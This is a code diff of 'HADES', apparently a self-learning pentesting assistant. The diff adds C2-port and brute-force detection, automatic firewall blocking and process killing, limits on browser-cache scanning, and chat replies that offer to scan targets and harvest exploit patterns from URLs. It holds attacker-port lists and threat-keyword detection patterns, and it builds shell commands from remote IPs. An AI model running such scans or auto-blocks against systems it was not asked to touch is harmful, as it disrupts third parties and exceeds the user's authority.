                 threat_details.append(f"Suspicious process pattern: {pattern}")
+                attack_technique = self.ATTACK_TECHNIQUES.get('exploitation')
                 break
                 
         if remote_port in [4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345]:
             threat_level = 'HIGH'
             threat_type = 'POTENTIAL_C2'
             threat_details.append(f"Potential C2/backdoor port: {remote_port}")
+            attack_technique = self.ATTACK_TECHNIQUES.get('c2_connection')
             
         conn['threat_level'] = threat_level
         conn['threat_type'] = threat_type
         conn['threat_details'] = threat_details
+        conn['attack_technique'] = attack_technique
         
         if threat_level != 'SAFE':
             self.stats['threats_detected'] += 1
@@ -651,32 +1314,233 @@ class NetworkMonitor(QThread):
             self.threat_detected.emit(conn)
             
             if self.learning_mode and self.kb:
-                self._learn_from_threat(conn)
+                self._learn_from_threat(conn, attack_technique)
                 
-            if self.defense_mode and threat_level in ['HIGH', 'CRITICAL']:
-                self._counter_attack(conn)
+            # Auto-defense based on threat level
+            if self.auto_defend and self.defense_mode:
+                self._auto_respond(conn, threat_level, threat_type, attack_technique)
         else:
             self.connection_detected.emit(conn)
             
         self.connection_history.append(conn)
         if len(self.connection_history) > 1000:
             self.connection_history = self.connection_history[-500:]
+    
+    def _update_ip_behavior(self, ip: str, port: int, conn: Dict):
+        """Track connection behavior for each IP"""
+        now = time.time()
+        behavior = self.ip_behavior[ip]
+        
+        # Add this connection
+        behavior['ports_accessed'].append((port, now))
+        behavior['connection_times'].append(now)
+        
+        # Clean old entries (outside time windows)
+        cutoff_scan = now - self.SCAN_THRESHOLD_TIME
+        cutoff_brute = now - self.BRUTE_FORCE_TIME
+        
+        behavior['ports_accessed'] = [(p, t) for p, t in behavior['ports_accessed'] if t > cutoff_scan]
+        behavior['connection_times'] = [t for t in behavior['connection_times'] if t > cutoff_brute]
+    
+    def _detect_behavioral_attack(self, ip: str) -> Optional[Dict]:
+        """Detect behavioral attacks like port scans and brute force"""
+        behavior = self.ip_behavior[ip]
+        
+        # Check for port scan
+        unique_ports = set(p for p, t in behavior['ports_accessed'])
+        if len(unique_ports) >= self.SCAN_THRESHOLD_PORTS:
+            self.stats['scans_detected'] += 1
+            behavior['threat_score'] += 2.0
+            return {
+                'level': 'HIGH',
+                'type': 'PORT_SCAN',
+                'technique': self.ATTACK_TECHNIQUES['port_scan'],
+                'details': [f"Port scan detected: {len(unique_ports)} ports in {self.SCAN_THRESHOLD_TIME}s",
+                           f"Ports: {sorted(list(unique_ports))[:10]}..."]
+            }
+        
+        # Check for brute force (many connections to auth ports)
+        auth_ports = {22, 23, 21, 3389, 5900, 445, 3306, 5432, 1433}
+        auth_connections = sum(1 for p, t in behavior['ports_accessed'] if p in auth_ports)
+        if auth_connections >= self.BRUTE_FORCE_THRESHOLD:
+            self.stats['brute_force_detected'] += 1
+            behavior['threat_score'] += 3.0
+            return {
+                'level': 'CRITICAL',
+                'type': 'BRUTE_FORCE',
+                'technique': self.ATTACK_TECHNIQUES['brute_force'],
+                'details': [f"Brute force attack detected: {auth_connections} auth attempts in {self.BRUTE_FORCE_TIME}s"]
+            }
+        
+        # Check accumulated threat score
+        if behavior['threat_score'] >= 5.0:
+            return {
+                'level': 'HIGH',
+                'type': 'SUSPICIOUS_BEHAVIOR',
+                'details': [f"Accumulated threat score: {behavior['threat_score']:.1f}"]
+            }
+        
+        return None
+    
+    def _auto_respond(self, conn: Dict, threat_level: str, threat_type: str, technique: Dict = None):
+        """Automatically respond to threats based on severity"""
+        remote_ip = conn.get('remote_ip')
+        if not remote_ip:
+            return
+        
+        response_action = None
+        response_details = []
+        
+        # Determine response based on threat level
+        if threat_level == 'CRITICAL':
+            response_action = 'block_perm'
+            response_details.append(f"Permanent block for CRITICAL threat: {threat_type}")
+            self._apply_firewall_block(remote_ip, permanent=True)
+            self._kill_connection(conn)
             
-    def _learn_from_threat(self, conn: Dict):
-        if self.kb:
-            finding = ThreatFinding(
-                path=f"Network:{conn.get('remote_addr', 'Unknown')}",
-                threat_type=conn.get('threat_type', 'network_threat'),
-                pattern=f"Port:{conn.get('remote_port')} Process:{conn.get('process', 'Unknown')}",
-                severity=conn.get('threat_level', 'MEDIUM'),
-                code_snippet=str(conn.get('threat_details', [])),
-                browser='Network Monitor',
-                context=f"PID:{conn.get('pid')} CMD:{conn.get('cmdline', '')[:100]}"
+        elif threat_level == 'HIGH':
+            response_action = 'block_temp'
+            response_details.append(f"Temporary block for HIGH threat: {threat_type}")
+            self._apply_firewall_block(remote_ip, permanent=False, ttl=3600)
+            
+        elif threat_level == 'WARNING':
+            response_action = 'warn'
+            response_details.append(f"Warning logged for: {threat_type}")
+        
+        # Add to blocked list
+        if response_action in ['block_perm', 'block_temp']:
+            self.blocked_ips.add(remote_ip)
+            self.MALICIOUS_IPS.add(remote_ip)
+            self.stats['attacks_blocked'] += 1
+            
+            # Update KB
+            if self.kb:
+                self.kb.block_ip(remote_ip, f"Auto-blocked: {threat_type}")
+                self.kb.log_attack_event(
+                    event_type=threat_type,
+                    src_ip=remote_ip,
+                    dst_port=conn.get('local_port', 0),
+                    severity=threat_level,
+                    evidence={'details': conn.get('threat_details', [])},
+                    action_taken=response_action,
+                    technique_id=technique['id'] if technique else None
+                )
+        
+        # Emit response signal
+        self.auto_response.emit({
+            'ip': remote_ip,
+            'action': response_action,
+            'threat_type': threat_type,
+            'threat_level': threat_level,
+            'details': response_details,
+            'technique': technique
+        })
+        
+        self.status_update.emit(f"⚔️ AUTO-DEFENSE: {response_action.upper()} on {remote_ip} ({threat_type})")
+    
+    def _apply_firewall_block(self, ip: str, permanent: bool = False, ttl: int = 3600):
+        """Apply OS-level firewall block"""
+        import platform
+        os_type = platform.system().lower()
+        
+        try:
+            if os_type == 'windows':
+                rule_name = f"HADES_BLOCK_{ip.replace('.', '_')}"
+                cmd = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=block remoteip={ip}'
+                import subprocess
+                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
+                self.status_update.emit(f"🛡️ Firewall: Blocked {ip} (Windows)")
+                
+            elif os_type == 'linux':
+                cmd = f'iptables -A INPUT -s {ip} -j DROP'
+                import subprocess
+                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
+                self.status_update.emit(f"🛡️ Firewall: Blocked {ip} (Linux)")
+                
+            elif os_type == 'darwin':
+                # macOS - requires pfctl setup
+                self.status_update.emit(f"🛡️ Block request for {ip} (macOS - manual pfctl needed)")
+                
+        except Exception as e:
+            self.status_update.emit(f"⚠️ Firewall block failed for {ip}: {str(e)[:50]}")
+    
+    def _kill_connection(self, conn: Dict):
+        """Kill an active connection by terminating the associated process"""
+        pid = conn.get('pid')
+        if not pid:
+            return
+        
+        try:
+            import psutil
+            proc = psutil.Process(pid)
+            proc_name = proc.name()
+            
+            # Safety check - don't kill system processes
+            safe_to_kill = proc_name.lower() not in [
+                'system', 'svchost.exe', 'csrss.exe', 'wininit.exe', 
+                'services.exe', 'lsass.exe', 'explorer.exe', 'init', 'systemd'
+            ]
+            
+            if safe_to_kill:
+                proc.terminate()
+                self.status_update.emit(f"🔥 Terminated process: {proc_name} (PID: {pid})")
+        except Exception as e:
+            pass
+            
+    def _learn_from_threat(self, conn: Dict, technique: Dict = None):
+        """Learn from detected threats and update knowledge base"""
+        if not self.kb:
+            return
+            
+        # Store as threat finding
+        finding = ThreatFinding(
+            path=f"Network:{conn.get('remote_addr', 'Unknown')}",
+            threat_type=conn.get('threat_type', 'network_threat'),
+            pattern=f"Port:{conn.get('remote_port')} Process:{conn.get('process', 'Unknown')}",
+            severity=conn.get('threat_level', 'MEDIUM'),
+            code_snippet=str(conn.get('threat_details', [])),
+            browser='Network Monitor',
+            context=f"PID:{conn.get('pid')} CMD:{conn.get('cmdline', '')[:100]}"
+        )
+        self.kb.store_threat_finding(finding)
+        
+        # Add to malicious IPs
+        if conn.get('remote_ip'):
+            self.MALICIOUS_IPS.add(conn['remote_ip'])
+        
+        # Store/update the attack technique
+        if technique:
+            mitigations = []
+            if technique['id'] == 'T1046':  # Port scan
+                mitigations = [
+                    "Enable firewall rules to block port scanning",
+                    "Implement port knocking for sensitive services",
+                    "Use intrusion detection systems (IDS)"
+                ]
+            elif technique['id'] == 'T1110':  # Brute force
+                mitigations = [
+                    "Implement account lockout policies",
+                    "Use multi-factor authentication",
+                    "Limit login attempts with fail2ban or similar",
+                    "Use strong password policies"
+                ]
+            elif technique['id'] == 'T1071':  # C2
+                mitigations = [
+                    "Block known C2 ports at firewall",
+                    "Monitor for unusual outbound connections",
+                    "Implement egress filtering"
+                ]
+            
+            self.kb.store_technique(
+                technique_id=technique['id'],
+                name=technique['name'],
+                category=technique['category'],
+                description=f"Detected via network monitoring",
+                indicators=[conn.get('threat_type', ''), f"Port: {conn.get('remote_port')}"],
+                mitigations=mitigations,
+                detection_rules=[f"Monitor for {technique['name']} patterns"],
+                confidence=0.8
             )
-            self.kb.store_threat_finding(finding)
-            
-            if conn.get('remote_ip'):
-                self.MALICIOUS_IPS.add(conn['remote_ip'])
                 
     def _counter_attack(self, conn: Dict):
         remote_ip = conn.get('remote_ip')
@@ -824,6 +1688,10 @@ class RequestInjector:
             baseline_status = 0
         
         for header, values in test_headers.items():
+            # Support both list-based fuzzing values and single static header values.
+            if isinstance(values, (str, int, float, bool)) or values is None:
+                values = [values]
+
             for value in values:
                 try:
                     headers = {header: value}
@@ -1308,6 +2176,11 @@ class BrowserScanner(QThread):
     finished_scan = pyqtSignal(dict)
     finding_detected = pyqtSignal(dict)
     
+    # Limits to prevent getting stuck
+    MAX_FILES_PER_BROWSER = 500  # Max files to scan per browser
+    MAX_TOTAL_FILES = 2000       # Max total files to scan
+    SCAN_TIMEOUT = 120           # Timeout in seconds per browser
+    
     THREAT_PATTERNS = [
         ('malware', r'malware|virus|trojan|ransomware', 'HIGH'),
         ('exploit', r'exploit|overflow|shellcode|payload', 'HIGH'),
@@ -1326,6 +2199,9 @@ class BrowserScanner(QThread):
         self.results = []
         self.findings = []
         self.stats = defaultdict(int)
+        self._files_scanned = 0
+        self._browser_file_count = 0
+        self._scan_start_time = 0
         
     def _get_browser_paths(self) -> Dict:
         local = os.environ.get('LOCALAPPDATA', '')
@@ -1346,20 +2222,36 @@ class BrowserScanner(QThread):
         self.results = []
         self.findings = []
         self.stats = defaultdict(int)
+        self._files_scanned = 0
         
         browsers = self._get_browser_paths()
         total = len(browsers)
         
+        self.status.emit("Starting browser cache scan...")
+        
         for i, (browser, path) in enumerate(browsers.items()):
-            if self._stop:
+            if self._stop or self._files_scanned >= self.MAX_TOTAL_FILES:
                 break
-            self.status.emit(f"Scanning {browser}...")
+                
+            self._browser_file_count = 0
+            self._scan_start_time = time.time()
+            
+            self.status.emit(f"Scanning {browser}... ({self._files_scanned} files so far)")
+            
             if os.path.exists(path):
-                self._scan_browser(browser, path)
+                try:
+                    self._scan_browser(browser, path)
+                except Exception as e:
+                    self.status.emit(f"Error scanning {browser}: {str(e)[:50]}")
+            else:
+                self.status.emit(f"{browser} not found, skipping...")
+                
             self.progress.emit(int((i + 1) / total * 100))
             
+        self.status.emit(f"Scan complete! {self._files_scanned} files scanned, {len(self.findings)} threats found.")
+        
         self.finished_scan.emit({
-            'results': self.results,
+            'results': self.results[-100:],  # Limit results to prevent memory issues
             'findings': self.findings,
             'stats': dict(self.stats)
         })
@@ -1368,31 +2260,82 @@ class BrowserScanner(QThread):
         cache_dirs = ['Cache', 'Code Cache', 'GPUCache', 'Service Worker']
         
         for cache_dir in cache_dirs:
+            if self._stop:
+                return
+            if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
+                self.status.emit(f"{browser}: Reached file limit ({self.MAX_FILES_PER_BROWSER}), moving on...")
+                return
+            if time.time() - self._scan_start_time > self.SCAN_TIMEOUT:
+                self.status.emit(f"{browser}: Timeout reached, moving on...")
+                return
+                
             cache_path = os.path.join(base_path, cache_dir)
             if os.path.exists(cache_path):
                 self._scan_directory(browser, cache_path)
                 
     def _scan_directory(self, browser: str, path: str):
         try:
+            file_count = 0
             for root, dirs, files in os.walk(path):
                 if self._stop:
                     return
-                for filename in files:
+                    
+                # Check limits
+                if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
+                    return
+                if self._files_scanned >= self.MAX_TOTAL_FILES:
+                    return
+                if time.time() - self._scan_start_time > self.SCAN_TIMEOUT:
+                    return
+                
+                # Skip very deep directories
+                depth = root.replace(path, '').count(os.sep)
+                if depth > 5:
+                    continue
+                    
+                for filename in files[:100]:  # Limit files per directory
+                    if self._stop:
+                        return
+                    if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
+                        return
+                        
                     filepath = os.path.join(root, filename)
-                    self._analyze_file(browser, filepath)
+                    try:
+                        self._analyze_file(browser, filepath)
+                        self._files_scanned += 1
+                        self._browser_file_count += 1
+                        file_count += 1
+                        
+                        # Emit progress periodically
+                        if file_count % 50 == 0:
+                            self.status.emit(f"Scanning {browser}... ({self._browser_file_count} files)")
+                    except Exception:
+                        pass
+                        
         except PermissionError:
+            pass
+        except Exception as e:
             pass
             
     def _analyze_file(self, browser: str, filepath: str):
+        # Check stop flag immediately
+        if self._stop:
+            return
+            
         try:
             stat = os.stat(filepath)
             size = stat.st_size
             
             if size > 5_000_000 or size == 0:
                 return
+            
+            # Check stop flag again before reading file
+            if self._stop:
+                return
                 
             content_preview = ""
             threats = []
+            raw_content = b''
             
             try:
                 with open(filepath, 'rb') as f:
@@ -1401,11 +2344,19 @@ class BrowserScanner(QThread):
                         content = raw_content.decode('utf-8', errors='ignore')
                         content_preview = content[:500]
                         
+                        # Check stop flag before pattern matching
+                        if self._stop:
+                            return
+                        
                         for threat_name, pattern, severity in self.THREAT_PATTERNS:
+                            if self._stop:
+                                return
                             matches = re.findall(pattern, content, re.IGNORECASE)
                             if matches:
                                 context_matches = re.findall(f'.{{0,50}}{pattern}.{{0,50}}', content, re.IGNORECASE)
                                 for match in context_matches[:3]:
+                                    if self._stop:
+                                        return
                                     finding = ThreatFinding(
                                         path=filepath,
                                         threat_type=threat_name,
@@ -1435,6 +2386,9 @@ class BrowserScanner(QThread):
                         pass
             except:
                 pass
+            
+            if self._stop:
+                return
                 
             risk = 'HIGH' if threats else ('MEDIUM' if any(p in filepath.lower() for p in ['.exe', '.dll', 'script']) else 'LOW')
             
@@ -1448,7 +2402,7 @@ class BrowserScanner(QThread):
                 
             self.results.append(CacheEntry(
                 path=filepath, size=size, modified=stat.st_mtime,
-                file_hash=hashlib.md5(raw_content[:1000]).hexdigest()[:8] if 'raw_content' in dir() else '',
+                file_hash=hashlib.md5(raw_content[:1000]).hexdigest()[:8] if raw_content else '',
                 file_type=os.path.splitext(filepath)[1] or '.unknown',
                 risk_level=risk, browser=browser, content_preview=content_preview
             ))
@@ -1607,24 +2561,88 @@ Just give me a URL or IP and I'll get to work!""",
         }
         
     def _generate_response(self, message: str) -> Dict:
+        """Generate intelligent responses based on learned knowledge"""
+        message_lower = message.lower()
+        
+        # Query knowledge base for relevant information
+        knowledge = self.kb.query_knowledge(message)
+        techniques = knowledge.get('techniques', [])
+        cves = knowledge.get('cves', [])
         exploits = self.kb.get_learned_exploits(5)
         patterns = self.kb.get_patterns()
-        message_lower = message.lower()
+        ip_info = knowledge.get('ip_info')
         
         # Check if message contains a URL or domain - probably wants to scan it
         url_match = re.search(r'https?://[^\s]+', message)
         domain_match = re.search(r'\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b', message, re.IGNORECASE)
+        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', message)
+        cve_match = re.search(r'CVE-\d{4}-\d+', message, re.IGNORECASE)
         
+        # Handle CVE queries
+        if cve_match:
+            cve_id = cve_match.group().upper()
+            cve_results = self.kb.search_cves(cve_id, 1)
+            if cve_results:
+                cve = cve_results[0]
+                response = f"**{cve_id}**\n\n"
+                response += f"**Summary:** {cve['summary'][:300]}...\n\n"
+                response += f"**CVSS Score:** {cve['cvss']}\n"
+                if cve['mitigations']:
+                    response += f"\n**Mitigations:**\n"
+                    for m in cve['mitigations'][:3]:
+                        response += f"• {m}\n"
+            else:
+                response = f"I don't have information about {cve_id} yet. I can learn about it if you point me to a URL with its details."
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Handle IP reputation queries
+        if ip_match and ip_info:
+            ip = ip_match.group()
+            response = f"**IP Reputation for {ip}:**\n\n"
+            response += f"• **Threat Score:** {ip_info['threat_score']:.1f}/10\n"
+            response += f"• **Attack Count:** {ip_info['attack_count']}\n"
+            response += f"• **Categories:** {', '.join(ip_info['categories']) if ip_info['categories'] else 'None'}\n"
+            response += f"• **Status:** {'🚫 BLOCKED' if ip_info['is_blocked'] else '✅ Not blocked'}\n"
+            response += f"• **First Seen:** {ip_info['first_seen'][:10] if ip_info['first_seen'] else 'N/A'}\n"
+            
+            if ip_info['threat_score'] >= 5.0:
+                response += f"\n⚠️ **This IP is considered HIGH RISK.** Consider blocking it."
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Handle target detection
         if url_match or domain_match:
             target = url_match.group() if url_match else domain_match.group()
             response = f"I detected a target: **{target}**\n\nWould you like me to scan it? Try:\n• 'scan {target}' - Full reconnaissance\n• 'learn from {target}' - Extract exploit patterns\n• 'vuln scan {target}' - Vulnerability scan"
             self.kb.store_chat('assistant', response)
             return {'response': response, 'action': None}
         
+        # Handle security topic queries using learned knowledge
+        security_keywords = ['sql', 'injection', 'xss', 'csrf', 'brute', 'scan', 'attack', 
+                            'vulnerability', 'exploit', 'defense', 'protect', 'secure',
+                            'port', 'firewall', 'detect', 'intrusion', 'malware']
+        
+        matched_keyword = None
+        for keyword in security_keywords:
+            if keyword in message_lower:
+                matched_keyword = keyword
+                break
+        
+        if matched_keyword and (techniques or exploits):
+            response = self._build_knowledge_response(matched_keyword, techniques, exploits, patterns)
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Standard responses
         if 'what' in message_lower and 'learn' in message_lower:
-            response = f"I've learned {len(patterns)} security patterns and {len(exploits)} exploits from various sources. "
+            response = f"I've learned **{len(patterns)} security patterns** and **{len(exploits)} exploits** from various sources.\n\n"
+            if techniques:
+                response += f"**Techniques I Know ({len(techniques)}):**\n"
+                for t in techniques[:5]:
+                    response += f"• {t['name']} ({t['category']})\n"
             if exploits:
-                response += f"Recent learnings include exploits from: {', '.join(set(e['source_url'][:30] for e in exploits[:3]))}"
+                response += f"\nRecent exploits from: {', '.join(set(e['source_url'][:30] for e in exploits[:3]))}"
         elif 'exploit' in message_lower:
             if exploits:
                 response = "Here are some exploits I've learned:\n"
@@ -1633,25 +2651,116 @@ Just give me a URL or IP and I'll get to work!""",
             else:
                 response = "I haven't learned any exploits yet. Point me to a URL with exploit code using 'learn from https://...'"
         elif 'who' in message_lower and 'you' in message_lower:
-            response = "I'm HADES - a self-learning AI pentesting assistant. I can scan targets, learn exploit patterns, analyze browser caches, and help you find vulnerabilities. Type 'help' to see what I can do!"
+            response = "I'm **HADES** - a self-learning AI pentesting assistant. I can:\n\n"
+            response += "• 🔍 Scan targets for vulnerabilities\n"
+            response += "• 📚 Learn exploit patterns from websites\n"
+            response += "• 🛡️ Monitor network and auto-defend against attacks\n"
+            response += "• 💡 Provide security guidance based on my knowledge\n\n"
+            response += f"I currently know **{len(patterns)} patterns**, **{len(exploits)} exploits**, and **{len(techniques)} techniques**."
         elif 'thank' in message_lower:
             response = "You're welcome! Ready for the next target whenever you are. 🔥"
+        elif 'defend' in message_lower or 'protect' in message_lower or 'block' in message_lower:
+            response = self._get_defense_guidance(message_lower)
         else:
-            response = "I'm not sure what you want me to do. Try:\n\n• **'scan https://example.com'** - Run a full scan\n• **'help'** - See all commands\n• **'show stats'** - View my statistics\n\nOr just give me a URL/IP and I'll figure out what to do with it!"
+            # Try to find relevant knowledge anyway
+            if techniques:
+                response = f"Based on my knowledge, you might be interested in:\n\n"
+                for t in techniques[:2]:
+                    response += f"**{t['name']}** ({t['category']})\n"
+                    if t['mitigations']:
+                        response += f"  Mitigations: {', '.join(t['mitigations'][:2])}\n"
+                response += f"\nOr try: **'help'** for commands, **'show stats'** for statistics"
+            else:
+                response = "I'm not sure what you want me to do. Try:\n\n• **'scan https://example.com'** - Run a full scan\n• **'help'** - See all commands\n• **'show stats'** - View my statistics\n\nOr just give me a URL/IP and I'll figure out what to do with it!"
             
         self.kb.store_chat('assistant', response)
         return {'response': response, 'action': None}
+    
+    def _build_knowledge_response(self, topic: str, techniques: List, exploits: List, patterns: List) -> str:
+        """Build an intelligent response based on learned knowledge"""
+        response = f"**🔍 Knowledge about '{topic}':**\n\n"
+        
+        # Add relevant techniques
+        relevant_techniques = [t for t in techniques if topic.lower() in t['name'].lower() 
+                              or topic.lower() in t['category'].lower() 
+                              or topic.lower() in t.get('description', '').lower()]
+        
+        if relevant_techniques:
+            response += "**Techniques:**\n"
+            for t in relevant_techniques[:3]:
+                response += f"• **{t['name']}** ({t['category']})\n"
+                if t['indicators']:
+                    response += f"  Indicators: {', '.join(t['indicators'][:2])}\n"
+                if t['mitigations']:
+                    response += f"  Mitigations: {', '.join(t['mitigations'][:2])}\n"
+        
+        # Add relevant exploits
+        relevant_exploits = [e for e in exploits if topic.lower() in e['exploit_type'].lower()]
+        if relevant_exploits:
+            response += f"\n**Learned Exploits ({len(relevant_exploits)}):**\n"
+            for e in relevant_exploits[:2]:
+                response += f"• {e['exploit_type']} from {e['source_url'][:40]}\n"
+        
+        # Add defensive guidance
+        response += f"\n**Defensive Recommendations:**\n"
+        if 'sql' in topic or 'injection' in topic:
+            response += "• Use parameterized queries/prepared statements\n• Implement input validation\n• Apply least privilege to database accounts\n"
+        elif 'xss' in topic:
+            response += "• Encode output properly\n• Use Content-Security-Policy headers\n• Validate and sanitize input\n"
+        elif 'brute' in topic:
+            response += "• Implement account lockout\n• Use MFA\n• Add rate limiting\n"
+        elif 'scan' in topic or 'port' in topic:
+            response += "• Use firewall rules to limit exposed ports\n• Implement port knocking\n• Use IDS/IPS systems\n"
+        else:
+            response += "• Keep systems updated\n• Monitor logs for anomalies\n• Implement defense in depth\n"
+        
+        return response
+    
+    def _get_defense_guidance(self, message: str) -> str:
+        """Provide defense guidance based on context"""
+        response = "**🛡️ Defense Guidance:**\n\n"
+        
+        if 'brute' in message or 'password' in message:
+            response += "**Against Brute Force:**\n"
+            response += "• Implement account lockout after 5 failed attempts\n"
+            response += "• Use MFA (multi-factor authentication)\n"
+            response += "• Add CAPTCHA after 3 failed attempts\n"
+            response += "• Use fail2ban or similar tools\n"
+        elif 'scan' in message or 'port' in message:
+            response += "**Against Port Scanning:**\n"
+            response += "• Enable firewall and close unnecessary ports\n"
+            response += "• Use port knocking for sensitive services\n"
+            response += "• Deploy IDS (Intrusion Detection System)\n"
+            response += "• Monitor for scanning patterns\n"
+        elif 'ddos' in message or 'dos' in message:
+            response += "**Against DDoS:**\n"
+            response += "• Use CDN with DDoS protection\n"
+            response += "• Implement rate limiting\n"
+            response += "• Have emergency response plan ready\n"
+        else:
+            response += "**General Security:**\n"
+            response += "• Keep all systems patched\n"
+            response += "• Enable HADES network monitoring with auto-defense\n"
+            response += "• Regularly review logs and alerts\n"
+            response += "• Implement least privilege access\n"
+        
+        response += "\n**Tip:** Enable my Network Monitor with Defense Mode for automatic protection!"
+        return response
         
     def _get_stats(self) -> str:
         cursor = self.kb.conn.cursor()
-        cursor.execute('SELECT COUNT(*) FROM experiences')
-        exp_count = cursor.fetchone()[0]
-        cursor.execute('SELECT COUNT(*) FROM security_patterns')
-        pattern_count = cursor.fetchone()[0]
-        cursor.execute('SELECT COUNT(*) FROM learned_exploits')
-        exploit_count = cursor.fetchone()[0]
-        cursor.execute('SELECT COUNT(*) FROM threat_findings')
-        threat_count = cursor.fetchone()[0]
+
+        def safe_count(table_name: str) -> int:
+            try:
+                cursor.execute(f'SELECT COUNT(*) FROM {table_name}')
+                return cursor.fetchone()[0]
+            except sqlite3.Error:
+                return 0
+
+        exp_count = safe_count('experiences')
+        pattern_count = safe_count('security_patterns')
+        exploit_count = safe_count('learned_exploits')
+        threat_count = safe_count('threat_findings')
         
         return f"""**HADES AI Statistics:**
 • Experiences: {exp_count}
@@ -1813,16 +2922,18 @@ class CodeEditorAssistant:
         except Exception as e:
             return f"❌ Explanation Error:\n{traceback.format_exc()}"
     
-    def gpt_analyze(self, code_snippet: str, instruction: str = "Analyze and improve this code") -> str:
+    def gpt_analyze(self, code_snippet: str, instruction: str = "Analyze and improve this code", api_key: str = None) -> str:
         """Use GPT to analyze or modify code"""
-        if not HAS_OPENAI or not openai:
+        if not HAS_OPENAI:
             return "[GPT] OpenAI module not available. Install with: pip install openai"
         
-        if not openai.api_key:
-            return "[GPT] No API key set. Set OPENAI_API_KEY environment variable."
+        key = api_key or os.getenv("OPENAI_API_KEY", "")
+        if not key:
+            return "[GPT] No API key set. Enter your API key in the Self-Improvement tab."
         
         try:
-            response = openai.ChatCompletion.create(
+            client = OpenAI(api_key=key)
+            response = client.chat.completions.create(
                 model="gpt-3.5-turbo",
                 messages=[
                     {"role": "system", "content": "You are an expert code assistant. Analyze code, find bugs, suggest improvements, and help with refactoring. Be concise and practical."},
@@ -1835,16 +2946,18 @@ class CodeEditorAssistant:
         except Exception as e:
             return f"[GPT ERROR] {e}"
     
-    def gpt_modify(self, code_snippet: str, instruction: str) -> str:
+    def gpt_modify(self, code_snippet: str, instruction: str, api_key: str = None) -> str:
         """Use GPT to modify code based on instruction"""
-        if not HAS_OPENAI or not openai:
+        if not HAS_OPENAI:
             return self.apply_instruction_local(instruction)
         
-        if not openai.api_key:
+        key = api_key or os.getenv("OPENAI_API_KEY", "")
+        if not key:
             return self.apply_instruction_local(instruction)
         
         try:
-            response = openai.ChatCompletion.create(
+            client = OpenAI(api_key=key)
+            response = client.chat.completions.create(
                 model="gpt-3.5-turbo",
                 messages=[
                     {"role": "system", "content": "You are a code modification assistant. Apply the user's instruction to modify the code. Return ONLY the modified code without explanations."},
@@ -1902,13 +3015,14 @@ class CodeEditorAssistant:
         else:
             return f"# Instruction not recognized locally. Install openai for GPT support.\n{self.current_code}"
     
-    def apply_instruction(self, instruction: str) -> str:
+    def apply_instruction(self, instruction: str, api_key: str = None) -> str:
         """Apply instruction - uses GPT if available, falls back to local"""
         if not self.current_code:
             return "⚠️ No code loaded. Use set_code() first."
         
-        if HAS_OPENAI and openai and openai.api_key:
-            return self.gpt_modify(self.current_code, instruction)
+        key = api_key or os.getenv("OPENAI_API_KEY", "")
+        if HAS_OPENAI and key:
+            return self.gpt_modify(self.current_code, instruction, api_key=key)
         else:
             return self.apply_instruction_local(instruction)
     
@@ -1947,6 +3061,62 @@ class HadesAI:
         self.last_code = ""
         self.files = {} # filename -> code str
         self.code_assistant = CodeEditorAssistant()
+        self.amp_threads_folder = os.getenv('HADES_AMP_THREADS_DIR', 'amp threads')
+        self.current_implementation_integration = None
+        self.current_implementation_catalog = {}
+        
+        # Initialize LLM conversation manager
+        if HAS_LLM_CORE:
+            self.llm_manager = ConversationManager()
+            logger.info("LLM Conversation Manager initialized with providers: %s", 
+                       self.llm_manager.get_available_providers())
+        else:
+            self.llm_manager = None
+            logger.warning("LLM Conversation Core not available")
+        
+        # Initialize cognitive memory system
+        if HAS_COGNITIVE_MEMORY:
+            self.cognitive = CognitiveLayer()
+            logger.info("Cognitive memory layer initialized")
+            # Start background memory optimizer
+            self._start_background_optimizer()
+        else:
+            self.cognitive = None
+            logger.warning("Cognitive memory system not available")
+        
+        # Learn from local amp thread exports at startup when available.
+        try:
+            import_result = self.learn_from_amp_threads_folder(self.amp_threads_folder)
+            if import_result.get('scanned_files', 0) > 0:
+                logger.info(
+                    "Amp threads sync complete: imported=%s skipped=%s failed=%s messages=%s",
+                    import_result.get('imported_threads', 0),
+                    import_result.get('skipped_threads', 0),
+                    import_result.get('failed_threads', 0),
+                    import_result.get('total_messages', 0),
+                )
+        except Exception as e:
+            logger.warning(f"Amp threads startup import failed: {str(e)}")
+
+        # Initialize defensive implementation-folder catalog (non-executing).
+        if HAS_IMPLEMENTATION_INTEGRATION and get_current_implementation_integration:
+            try:
+                self.current_implementation_integration = get_current_implementation_integration()
+                if hasattr(self.current_implementation_integration, 'get_catalog'):
+                    self.current_implementation_catalog = self.current_implementation_integration.get_catalog()
+                else:
+                    self.current_implementation_catalog = {}
+
+                logger.info(
+                    "Implementation catalog initialized: folder=%s files=%s",
+                    self.current_implementation_catalog.get('base_path', 'n/a'),
+                    self.current_implementation_catalog.get('total_files', 0),
+                )
+            except Exception as e:
+                logger.warning(f"Implementation catalog initialization failed: {str(e)}")
+
+        self._optimizer_thread = None
+
     def chat(self, message: str) -> Dict:
         return self.chat_processor.process(message)
         
@@ -1956,10 +3126,310 @@ class HadesAI:
     def get_stats(self) -> Dict:
         cursor = self.kb.conn.cursor()
         stats = {}
+
+        def safe_count(table_name: str) -> int:
+            try:
+                cursor.execute(f'SELECT COUNT(*) FROM {table_name}')
+                return cursor.fetchone()[0]
+            except sqlite3.Error:
+                return 0
+
         for table in ['experiences', 'security_patterns', 'learned_exploits', 'threat_findings', 'cache_entries']:
-            cursor.execute(f'SELECT COUNT(*) FROM {table}')
-            stats[table] = cursor.fetchone()[0]
+            stats[table] = safe_count(table)
+        stats['amp_learning'] = self.kb.get_amp_learning_stats()
+        stats['implementation_catalog'] = {
+            'base_path': self.current_implementation_catalog.get('base_path', ''),
+            'exists': self.current_implementation_catalog.get('exists', False),
+            'total_files': self.current_implementation_catalog.get('total_files', 0),
+            'by_extension': self.current_implementation_catalog.get('by_extension', {}),
+        }
+        if self.cognitive:
